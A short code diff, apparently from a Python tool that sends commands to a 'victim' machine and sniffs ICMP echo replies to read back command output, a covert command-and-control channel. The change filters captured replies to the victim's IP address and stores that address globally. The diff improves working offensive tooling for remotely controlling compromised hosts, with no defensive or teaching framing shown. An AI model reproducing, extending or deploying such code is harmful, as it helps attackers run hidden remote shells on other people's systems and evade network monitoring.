@@ -22,7 +22,7 @@ def send_command(victim_ip, command, force):
 keep_sniffing = True
 def process_packet(packet):
     global keep_sniffing
-    if packet.haslayer(ICMP) and packet[ICMP].type == 0:
+    if packet.haslayer(ICMP) and packet[ICMP].type == 0 and packet[IP].src == victim_ip:
         if packet.haslayer(Raw):
             payload = packet[Raw].load
             output = payload.decode('utf-8').strip()
@@ -39,6 +39,8 @@ def main():
         return
 
     vic_ip = argv[1]
+    global victim_ip
+    victim_ip = vic_ip
     force = "-f" in argv
     cmd = input("Command: ")
 
